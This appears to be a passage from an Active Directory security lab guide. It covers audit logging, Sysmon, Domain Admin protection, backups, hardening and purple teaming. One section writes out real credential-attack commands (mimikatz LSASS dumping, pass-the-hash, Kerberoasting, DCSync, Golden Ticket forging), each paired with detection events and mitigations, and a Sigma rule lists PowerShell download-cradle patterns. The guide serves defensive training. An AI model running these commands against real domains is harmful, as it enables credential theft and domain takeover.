| Security (Event ID: 4624) | Logon success |
| Security (Event ID: 4625) | Logon failure |
| Security (Event ID: 4672) | Special privilege logon (Admin) |
| Security (Event ID: 4688) | Process creation |
| Security (Event ID: 4769) | Kerberos TGS request |
| Security (Event ID: 4720) | New user created |
| Security (Event ID: 4728/4732) | User added to group |
| Security (Event ID: 4648) | Logon using explicit credentials |
| Directory Service (4662) | DCSync activity |

> ⚠️ Many are not enabled by default.
> 
> 
> You need to **enable “Audit Process Creation”, “Audit Directory Service Replication”, and others** in GPO.
> 

---

## 🧪 2. Configure GPO for Audit Policies

**Edit or Create GPO → Computer Config → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration**

**Set the following:**

```
Audit Process Creation → Success
Audit Logon Events → Success, Failure
Audit Account Logon → Success, Failure
Audit Directory Service Access → Success
Audit Policy Change → Success, Failure
Audit Privilege Use → Success, Failure

```

Also enable:

- `Include command line in process creation events`

```bash
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

```

---

## 🔎 3. Deploy Sysmon for Deep Monitoring

### Install Sysmon:

```bash
Sysmon64.exe -accepteula -i sysmonconfig.xml

```

Use a hardened config like [SwiftOnSecurity's](https://github.com/SwiftOnSecurity/sysmon-config).

### Key Sysmon Events:

| Event ID | Meaning |
| --- | --- |
| 1 | Process Create |
| 3 | Network Connection |
| 10 | Process Access (e.g., mimikatz injection) |
| 11 | File Created |
| 13 | Registry modification |
| 22 | DNS query |

Use with ELK stack, Graylog, Splunk, or Wazuh.

---

## 🌐 4. Enable Windows Event Forwarding (WEF)

This pulls logs from domain endpoints into a **central collector**.

### On the Collector:

- Install Windows Event Collector service
- Start it: `wecutil qc`

### On GPO:

- Computer Config → Admin Templates → Windows Components → Event Forwarding
- Configure subscriptions

### Benefits:

- No agent needed
- Native, scalable
- Works across thousands of endpoints

---

## ⚠️ 5. Spotting Real Attacks (Examples)

| Suspicious Behavior | Event(s) to Watch |
| --- | --- |
| Kerberoasting | 4769 (TGS Request), high volume for SPNs |
| DCSync attempt | 4662, 4670 |
| Pass-the-Hash (PtH) | 4624 + 4648 + NTLM logon type |
| Lateral movement (WinRM, SMB) | 4624 + Event ID 3 (Sysmon) |
| Golden Ticket use | 4769 (w/ nonexistent SID) |
| RDP bruteforce | Multiple 4625 failures |

> ⚔️ Bonus: Look for logon Type 3 (network) from unusual IPs
> 
> 
> Or **Type 10 (remote interactive)** from unexpected sources
> 

---

## 📦 6. SIEM Integration (Optional but 🔥)

- Use **Wazuh**, **Graylog**, or **Splunk Free**
- Configure Sysmon + WEF logs as input
- Build alerts on:
    - Event ID 4769 to service accounts
    - Multiple 4625s + successful 4624
    - User added to Domain Admins (4728/4732)
    - Powershell execution with base64 (4688 + command line)

---

## 🧠 7. Blue Team Playbook Summary

| Goal | Action |
| --- | --- |
| Monitor logins | Enable 4624, 4625, 4648 |
| Track privilege usage | Enable 4672, 4673, 4688 |
| Watch AD abuse | Enable 4662, 4728, 4729, 4769 |
| Detect lateral movement | Enable 3 (Sysmon), 4624, 4688 |
| Enable log visibility | Deploy WEF and Sysmon |
| Central log storage | SIEM or event collector |

---

### **Part 11: Securing Domain Admins – The Crown Jewel Protocol**

*— because if they get your DA creds, it’s game over.*

---

## 🧠 Why Protect Domain Admins?

Domain Admins (DAs) are **god-mode accounts**. If an attacker compromises even *one*, they own the domain:

- They can create users, dump hashes, push GPOs, disable defenses, and exfiltrate everything.
- Most ransomware campaigns pivot off DA compromise.
- DAs are often overused, under-segmented, and **logged in everywhere** — big mistake.

Let’s fix that.

---

## 🔐 Step 1: Reduce the Number of DAs

Run this PowerShell command to list all current DAs:

```powershell
Get-ADGroupMember "Domain Admins"

```

🚨 **Trim this list aggressively.**

If someone doesn’t need 24/7 DA rights, **remove them**.

Use **Privileged Access Workstations (PAWs)** and temporary elevation (e.g., using LAPS, PIM, or manual process).

---

## 🧱 Step 2: Implement Tiered Administration

Microsoft's **Tier Model** for access control:

| Tier | Scope | Examples |
| --- | --- | --- |
| Tier 0 | Domain Controllers, AD FS, PKI | Domain Admins, Enterprise Admins |
| Tier 1 | Servers, Applications | Server Admins |
| Tier 2 | Workstations | Helpdesk, Desktop Admins |

### Rules:

- **Tier 0 admins NEVER log in to Tier 1 or 2 systems.**
- Use separate accounts per tier:
    - `jasstej.admin` → Tier 0
    - `jasstej.serveradmin` → Tier 1
    - `jasstej.user` → Tier 2

> 📌 Even if one system is compromised, the blast radius is contained.
> 

---

## 🛑 Step 3: Block DA Logins to Workstations

Create a GPO:

- Go to: `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → User Rights Assignment`
- Policy: **Deny log on locally** and **Deny access through RDP**
- Add: `Domain Admins`

**Link it to Workstations OU**

Result: even if a DA account is phished, it can’t be used from a user PC.

---

## 💼 Step 4: Create Admin Workstations (PAW)

Privileged Access Workstations (PAWs) are hardened VMs or physical PCs **only for administrative tasks**.

Key features:

- No Internet browsing
- Logging enabled
- Application whitelisting
- BitLocker enforced
- Use Windows Defender Credential Guard

Make sure **DAs only log in from PAWs**.

---

## 🔁 Step 5: Rotate the KRBTGT Account

**krbtgt** is the account that signs Kerberos tickets. If its hash is stolen (e.g., via DCSync), attackers can forge **Golden Tickets**.

To rotate:

```powershell
Reset-ADServiceAccountPassword -Identity krbtgt

```

> 🔁 You must do this twice to invalidate old tickets fully.
> 

### Caution:

- Rotate only when you **know DA credentials are secure**.
- Replication delay can cause issues if done hastily.

---

## 🧪 Step 6: Monitor DA Account Usage

Set alerts for:

- DA logon to any non-DC system (Event ID 4624 + account + hostname)
- DA added to group (Event ID 4728)
- DCSync attempt (Event ID 4662)
- Credential use via explicit logon (Event ID 4648)

Sysmon + SIEM is 🔑 here.

---

## ✅ Summary Checklist

| Defense | Implemented? |
| --- | --- |
| DA count trimmed | ✅ |
| Tiered model in place | ✅ |
| Logon restrictions applied | ✅ |
| PAWs deployed | ✅ |
| krbtgt rotated | ✅ |
| SIEM alerts configured | ✅ |

---

### **Part 12: AD Backup, Recovery & Disaster Planning**

*— “Hope is not a strategy. Backups are.”*

---

## 💥 Why This Matters

You can patch every CVE, restrict every login, lock down every tier — but if ransomware nukes your DCs or corrupts your AD database, it’s game over *unless you can restore fast*.

This part covers:

- What to back up
- How to back it up
- How to **test** your recovery
- Secure storage + rollback strategy

---

## 🧾 1. What Needs to Be Backed Up?

Not just the DC — you need **specific AD-critical components**:

| Component | Why It's Critical |
| --- | --- |
| NTDS.dit | The main AD database |
| SYSVOL | Group Policies + login scripts |
| Registry (System state) | Includes services, boot config, AD configs |
| Certificate Services DB | If using internal PKI |
| DNS zone data | Especially if DNS is AD-integrated |

> ✅ Best Practice: Take a System State Backup — it includes most of the above.
> 

---

## 🖥️ 2. How to Perform a System State Backup

You can use **Windows Server Backup**, PowerShell, or enterprise backup tools.

### PowerShell Method:

```powershell
wbadmin start systemstatebackup -backupTarget:D: -quiet

```

- `D:` should be an **external volume** or dedicated backup drive.
- Automate this via Task Scheduler.

---

## 💾 3. Store Backups Securely

You’re backing up credentials and domain config — make sure the backup itself isn’t a vulnerability.

| Rule | Description |
| --- | --- |
| 1. Air-gapped backups | Keep at least one offline or cold backup |
| 2. Encrypt backups | Use BitLocker, VeraCrypt, or backup tool encryption |
| 3. Access controls | Only Tier 0 admins should access backups |
| 4. Backup retention | Keep multiple restore points (daily, weekly, monthly) |

> 🚨 Ransomware targets backup shares — isolate them.
> 

---

## 🔄 4. Restoring AD From Backup

### Use Directory Services Restore Mode (DSRM)

1. Reboot DC into **DSRM** (press F8 before boot)
2. Login using **DSRM local admin account**
3. Use `wbadmin` to restore:

```powershell
wbadmin start systemstaterecovery -version:<version> -backupTarget:D: -quiet

```

1. Reboot and validate AD functionality.

---

## 🧪 5. Practice Disaster Recovery Drills

Just having a backup means nothing if you can’t restore **under pressure**.

✅ At least **once every quarter**, perform:

- A **test restore** to isolated environment
- Validate:
    - DC boots cleanly
    - GPOs apply correctly
    - Replication works
    - User accounts intact

💡Use a **virtualized lab** with a snapshot of the restored domain.

---

## 🛡️ 6. Plan for Total Domain Loss (Forest Recovery)

If every DC is encrypted or wiped:

- Use **Microsoft’s Forest Recovery Guide**
- Rebuild clean DCs from trusted backups
- Reinstall Certificate Authorities (if applicable)
- Rejoin members manually if SID history is lost

> Worst-case = domain rebuild + workstation rejoin
> 
> 
> Prevent it with **multi-site backup** and **strong RBAC**.
> 

---

## 📋 Summary Table

| Backup Component | Method | Frequency |
| --- | --- | --- |
| System State | `wbadmin` or Windows Server Backup | Daily/Weekly |
| SYSVOL (GPOs) | Part of System State | Included |
| DNS Zones | Export via `dnscmd` | Weekly |
| CA Database | Export using certutil | Monthly |
| AD Snapshots (optional) | `ntdsutil snapshot` | Weekly |

---

### **Part 13: Attacker TTPs & Detection Lab**

*— “To defend like a lion, you must first hunt like a wolf.”*

---

## 🎯 Objective:

This is where theory becomes real. We simulate common Active Directory attacks—**TTPs (Tactics, Techniques, and Procedures)**—and **detect** them using native Windows logs, Sysmon, and open-source tooling.

You’ll get:

- What the attacker does (Red)
- How we detect it (Blue)
- Tools, logs, and alerts
- Real commands, not just talk

Let’s go step by step.

---

## ⚒️ 1. Credential Harvesting

### 🛑 Technique: Dumping LSASS with Mimikatz

**Red Side:**

```bash
mimikatz.exe
sekurlsa::logonpasswords

```

**Alternative:**

```bash
procdump.exe -ma lsass.exe lsass.dmp

```

### 🔎 Blue Side – Detection:

| Method | Details |
| --- | --- |
| Sysmon | Event ID 10 → Process access to `lsass.exe` |
| Windows Logs | Event ID 4688 → suspicious process creation |
| Sigma Rule | Detects `procdump` or `mimikatz` targeting LSASS |

**Mitigation:**

- Enable Credential Guard
- Restrict admin access
- Block unsigned binaries via AppLocker

---

## 🧲 2. Lateral Movement – Pass-the-Hash

### 🛑 Technique: Using NTLM hash to access other systems

```bash
mimikatz # sekurlsa::pth /user:Admin /domain:corp.local /ntlm:<hash>

```

### 🔎 Blue Side – Detection:

| Signal | How to See It |
| --- | --- |
| 4624 Logon with Type 3 or 9 | From unexpected host |
| No password used | Shows NTLM used |
| Kerberos ticket absence | Indicates PTH vs legitimate auth |

**Defenses:**

- Use LAPS or randomize local admin passwords
- Disable SMBv1
- Isolate admin accounts per tier

---

## 🧠 3. Kerberoasting

### 🛑 Technique: Requesting service tickets to crack offline

```bash
GetUserSPNs.py -dc-ip <DC-IP> corp.local/jasstej:<password>

```

**Extracted TGS → Hashcat → cracked password**

### 🔎 Blue Side – Detection:

| Indicator | Details |
| --- | --- |
| High volume of TGS-REQ | Event ID 4769 |
| SPN requests from same user | Suspicious enumeration pattern |
| Account lockouts after TGT | Indicates password spray or cracking |

**Mitigation:**

- Disable RC4 encryption
- Rotate service account passwords
- Use AES keys + Managed Service Accounts (gMSA)

---

## 🧰 4. DCSync Attack

### 🛑 Technique: Simulate a Domain Controller and request credential hashes

```bash
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

```

### 🔎 Blue Side – Detection:

| Signal | Detection |
| --- | --- |
| Event ID 4662 | Audit Directory Services Access |
| Target: `replicating directory changes` | 🛑 Red flag |
| Account doing DCSync ≠ DC | Malicious |

**Mitigation:**

- Audit 4662 + enable object-level auditing
- Restrict `Replicating Directory Changes` permission
- Monitor group membership changes (Enterprise Admins)

---

## 🧑‍💻 5. Golden Ticket Attack

### 🛑 Technique: Forge Kerberos tickets using krbtgt hash

```bash
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21... /krbtgt:<hash>

```

### 🔎 Blue Side – Detection:

| Log Event | Detail |
| --- | --- |
| 4769 w/ unusual lifetime | TGT never expires |
| 4624/4672 on random systems | Privileged logons everywhere |
| Time anomalies | Logons before ticket issued time |

**Mitigation:**

- Rotate krbtgt twice post-compromise
- Implement tiered admin model
- Audit TGT issuance volume

---

## 🛑 Real Talk: Most Blue Teams Miss This

Default logs won’t show everything. You need:

- **Sysmon**
- **Audit Policy Tweaks**
- **ELK or SIEM pipeline**
- **Sigma Rules** + Yara + community playbooks

---

## 🛡️ Toolkit – Build Your Lab Defense Stack

| Tool | Use |
| --- | --- |
| Sysmon | Deep process logging |
| Winlogbeat | Ship logs to ELK/Splunk |
| HELK or Wazuh | Free SIEM stacks |
| Sigma Rules | Detection logic for attack patterns |
| Velociraptor | DFIR + live response |
|  |  |

---

### **Part 14: Active Directory Hardening – GPOs, Configs & Real-World Fortification**

*— “An open gate invites war. A hardened domain rules in peace.”*

---

## 🔐 Objective:

Now we flip fully to defense. You’ll apply Group Policy Objects (GPOs), configuration changes, and service restrictions that make AD hardened enough to *survive real-world APTs and ransomware storms*.

This ain’t theory. It’s practical, enforced, tested.

We cover:

- GPOs for system & user security
- Admin tiering, service lockdown
- Secure baseline configs
- Disabling legacy attack surfaces

---

## 🛠️ 1. GPOs for Domain Hardening

Group Policy = your strongest domain-wide weapon.

### 1.1. **Account Lockout Policy**

```
Threshold: 5 attempts
Duration: 15 minutes
Reset count: 15 minutes

```

📌 Defends against brute-force, password-spraying.

---

### 1.2. **Password Policy**

| Setting | Recommended |
| --- | --- |
| Minimum length | 14+ characters |
| Complexity requirement | Enabled |
| Max password age | 30-60 days |
| Min password age | 1 day |

📌 Combine with **LAPS** to protect local admin creds.

---

### 1.3. **Disable LM & NTLM v1**

```
Network security: LAN Manager auth level → Send NTLMv2 response only. Refuse LM & NTLM

```

📌 Legacy auth = attacker playground.

---

### 1.4. **Turn off SMBv1**

```
Set-SmbServerConfiguration -EnableSMB1Protocol $false

```

Or via GPO:

```
Computer Configuration → Administrative Templates → SMB 1.0/CIFS File Sharing Support → Disable

```

📌 EternalBlue, WannaCry, etc. all abuse SMBv1.

---

### 1.5. **Restrict RDP Access**

- Use GPO to **limit RDP to specific security groups**
- Audit logon type 10 (RemoteInteractive)
- Disable clipboard/file sharing in RDP sessions

📌 RDP is a major post-exploitation route.

---

## 🧑‍💻 2. Tiered Administration (Admin Tiering)

Split accounts by **function**. Example:

| Tier | Scope | Who belongs |
| --- | --- | --- |
| Tier 0 | Domain Controllers | Enterprise Admins |
| Tier 1 | Member Servers | Server Admins |
| Tier 2 | Workstations | Helpdesk/Admins |

**Each tier only logs into its tier’s machines.**

📌 Blocks lateral movement. Zero trust foundation.

---

## 🔧 3. Harden Services & Features

Disable what attackers love:

| Service / Feature | Status | Why |
| --- | --- | --- |
| Windows Script Host | Disabled | Prevents VBS-based payloads |
| Macros in Office | Blocked | Prevents phishing payloads |
| Autorun & Autoplay | Disabled | USB attacks |
| WDigest authentication | Disabled | Prevents password-in-memory leaks |

---

### 3.1 Disable WDigest (if not already):

```powershell
Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0

```

---

### 3.2 PowerShell Constrained Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

```

📌 Blocks PowerShell obfuscation & post-exploitation scripts.

---

## 📋 4. Secure Local Admin Accounts

- **LAPS**: Local Admin Password Solution
    - Randomizes local admin passwords
    - Stores in AD, access controlled
- **Block reuse** of local admin creds across machines
- Disable unused accounts (Guest, legacy users)

---

## 🧯 5. Firewalls, Logging, & Monitoring

- Enable **Windows Defender Firewall** on all hosts
- Audit:
    - **Logon Events**
    - **Object Access**
    - **Directory Services Access**
- Forward logs to central **SIEM**

---

## 📌 GPO Deployment Strategy

1. **Build in a Test OU first**
2. Use **WMI Filtering** to apply GPOs by OS version
3. Link GPOs to **OUs**, not root domain
4. **Block inheritance** where needed (Tier 0 protection)
5. Use **Advanced Group Policy Management (AGPM)** for version control

---

## 🛡️ Bonus: Attack Surface Reduction (ASR) Rules (Defender)

Deploy via GPO or Intune:

```powershell
Set-MpPreference -AttackSurfaceReductionRules_Ids <rule_guid> -AttackSurfaceReductionRules_Actions Enabled

```

Example: Block Office from creating child processes, block credential stealing via LSASS.

---

## ✅ Summary Checklist

| Item | Hardened? |
| --- | --- |
| Password policy | ✅ |
| Account lockout policy | ✅ |
| SMBv1 disabled | ✅ |
| Tiered admin model | ✅ |
| LAPS deployed | ✅ |
| Legacy services disabled | ✅ |
| Logging & central log storage | ✅ |
| RDP restricted & audited | ✅ |
| PowerShell restricted | ✅ |

---

### **Part 15: Detection Engineering – Windows Event IDs, Sysmon & Sigma Correlation**

*— “What you can’t see will breach you.”*

---

## 🎯 Goal:

We now leave passive defense behind. In this part, you’ll **actively engineer detection**. From raw Windows logs to **Sysmon** precision to **Sigma rules**—this is how blue teams hunt in the dark.

Let’s make your domain scream when it’s under attack.

---

## 🔍 1. Understanding Windows Event Logging

Windows logs are *noisy*. But certain **Event IDs** matter more than others.

### 🧱 Core Security Log Events

| Event ID | Description |
| --- | --- |
| 4624 | Successful Logon |
| 4625 | Failed Logon |
| 4672 | Special privileges assigned |
| 4688 | Process creation |
| 4697 | Service installed |
| 4719 | Audit policy change |
| 4732 | User added to security group |
| 4776 | NTLM Authentication |
| 5140 | SMB share access |

**What to look for**:

- Logon Type 3 = network logon
- Logon Type 10 = RDP
- New process spawned by `cmd.exe`, `powershell.exe`, or `wscript.exe`
- Privileged group membership changes

---

## ⚙️ 2. Sysmon: Precision Telemetry

**Sysmon** (System Monitor) is a Microsoft tool that logs detailed system activity.

> 📦 Download: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
> 

### Install & Configure

```powershell
Sysmon64.exe -accepteula -i sysmonconfig.xml

```

Use the **SwiftOnSecurity config** to start:

🔗 [https://github.com/SwiftOnSecurity/sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config)

---

### 🧠 Key Sysmon Event IDs

| Sysmon ID | Description |
| --- | --- |
| 1 | Process Creation |
| 3 | Network connection |
| 7 | Image loaded |
| 8 | CreateRemoteThread (injection) |
| 10 | Process Access (LSASS targeting) |
| 11 | File created |
| 13 | Registry value set |
| 22 | DNS Query |

These IDs are **gold** for detecting:

- Cobalt Strike beacons
- Living off the Land (LOLBins)
- Credential dumping
- Command and Control (C2)

---

## ⚠️ 3. Real-World Use Cases (Log Hunting)

### 🔸 Detect RDP Brute Force

Look for:

- 4625 (failed logon) + Logon Type 10
- High count from same IP or account

### 🔸 Detect Suspicious Process Spawning

Sysmon Event ID 1:

- Parent: `winword.exe`
- Child: `powershell.exe` or `cmd.exe`

📌 Classic phishing payload indicator.

### 🔸 Detect Credential Dumping

Sysmon ID 10 (LSASS access):

- Target process: `lsass.exe`
- Source: non-system process like `procdump.exe`, `mimikatz.exe`, or unnamed binaries

---

## 🧪 4. Sigma Rules – Detection-as-Code

**Sigma** is like the “YAML of detection.”

You write platform-agnostic detection rules → convert them to **SIEM format**.

Example rule: Detect suspicious PowerShell execution

```yaml
title: Suspicious PowerShell Usage
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection:
    Image: '*\powershell.exe'
    CommandLine|contains:
      - 'IEX'
      - 'DownloadString'
      - 'Invoke-Expression'
  condition: selection
level: high

```

Convert using **Sigmac**:

```bash
sigmac -t splunk suspicious_powershell.yml

```

---

## 🧰 5. Tools to Centralize and Correlate

- **Windows Event Forwarding (WEF)** – Native log forwarding
- **Elastic Stack (ELK)** – Powerful + open source
- **Graylog** – Simpler, easier SIEM
- **Splunk** – Enterprise standard (costly)

Correlate:

- Sysmon logs
- Security Events
- DNS + Firewall logs

---

## ✅ Summary: Your Detection Pipeline

| Layer | Tool/Source | Use |
| --- | --- | --- |
| Raw Logs | Event Viewer | Local manual checking |
| Enhanced Logs | Sysmon | Process, network, and registry data |
| Correlation | SIEM + Sigma rules | Alerting + threat detection |
| Response | EDR/SOAR integration | Automate responses |

> ❗Remember: Prevention can fail. Detection is your early warning radar.
> 

---

### **Part 16: Purple Teaming & Simulated Attacks – Building Detection Resilience**

*— “The real test begins when your detection faces live fire.”*

---

## 🎯 Why Purple Teaming?

Red teams attack.

Blue teams defend.

**Purple teams**? They **collaborate**.

Purple teaming is not just a buzzword - it’s about **controlled offensive testing** to **improve detection and response**. Think of it as a sparring match where everyone learns.

---

## 🧪 1. What to Simulate (Tactics, Techniques & Procedures)

Use the MITRE **ATT&CK Framework** to simulate attacker behavior.

### 🧠 Key TTP Categories to Test:

| Tactic | Technique Example | Simulation Tool |
| --- | --- | --- |
| Initial Access | Phishing via macro | `macro_pack`, `Empire` |
| Execution | PowerShell obfuscated commands | `Invoke-Obfuscation` |
| Persistence | Registry run keys, service creation | Manual or `PERSIST` script |
| Priv. Esc | Token impersonation, UAC bypass | `SharpUp`, `WinPEAS` |
| Credential Access | LSASS dumping | `mimikatz`, `procdump` |
| Lateral Movement | WMI, PsExec | `CrackMapExec`, `Impacket` |
| Collection | Clipboard, screenshots | `SharpShooter`, `Nishang` |
| C2 | Encrypted beaconing | `Cobalt Strike`, `Sliver` |
| Exfiltration | Upload via DNS/HTTP | `dnsExfil`, `Exfiltrate` |

> You’re not just testing if your AV screams—you’re checking if your logs catch it.
> 

---

## 🛠️ 2. Lab Setup for Simulation

To simulate safely:

- **Isolate** in a virtual network (use VirtualBox/VMware + pfSense)
- Include:
    - 1 Domain Controller (Server 2019)
    - 1 Windows 10 user VM
    - 1 Kali or Parrot Red Team box
- Deploy:
    - Sysmon
    - WEF or ELK
    - Sigma rules or custom queries

---

## ⚔️ 3. Run Adversary Emulation Tools

### 🔹 Atomic Red Team

> Lightweight tests for ATT&CK techniques.
> 
- Clone:
    
    ```bash
    git clone https://github.com/redcanaryco/atomic-red-team.git
    
    ```
    
- Run tests:
    
    ```powershell
    Invoke-AtomicTest T1059.001 -ShowDetailsBrief
    
    ```
    

### 🔹 Caldera by MITRE

> Automated APT simulations with agents.
> 
- Deploy `Sandcat` agent on victim
- Run emulation plans (e.g. APT29)

---

## 📈 4. Evaluate Detection Coverage

After running each test:

- Check:
    - Event logs
    - Sysmon entries
    - SIEM alerts
- Ask:
    - Did the alert fire?
    - Was it noisy or precise?
    - Was it **too late**?

> Use heat maps of ATT&CK coverage to find blind spots.
> 

---

## 📣 5. Tune Detection Based on Gaps

If something slipped through:

- **Tune Sysmon filters**
- **Write/modify Sigma rules**
- Add **new log sources** (e.g., registry, DNS)
- Build alert logic:
    - Thresholds (e.g., >5 failed logons)
    - Sequences (e.g., `lsass.exe` access → exfil)

---

## 🧬 6. Automate & Evolve

Purple teaming isn’t once-a-year. It's **continuous**.

### Build a Pipeline:

1. **Simulate attack**
2. **Capture logs**
3. **Analyze detection**
4. **Tune + retest**
5. **Document + train team**

---

## 🧰 Tools You Can Use

| Purpose | Tools |
| --- | --- |
| Simulation | Atomic Red Team, Caldera, Metasploit |
| Logging | Sysmon, Event Forwarding |
| Detection Rules | Sigma, YARA |
| Correlation | Graylog, Splunk, ELK |
| Response | Velociraptor, OSSEC, Wazuh |

---

## ✅ Summary: Why This Matters

You don’t want to **hope** your SOC works. You want to **know** it does. Purple teaming makes it **provable**.

| Win For Red Team | Win For Blue Team |
| --- | --- |
| Find blind spots | Catch real attacks faster |
| Evade defenders | Tune alert logic |
| Improve stealth | Reduce false positives |

---

> “An untested defense is a paper fortress.”
> 

That’s it. The final part of your **Active Directory Lab Guide**.

You now have:

- A hardened domain
- Credential protection
- Secure delegation
- Logging + detection
- And **live-fire-tested defenses**

If you want a **PDF export**, **attack checklists**, or a custom **Purple Team script pack**, just say so.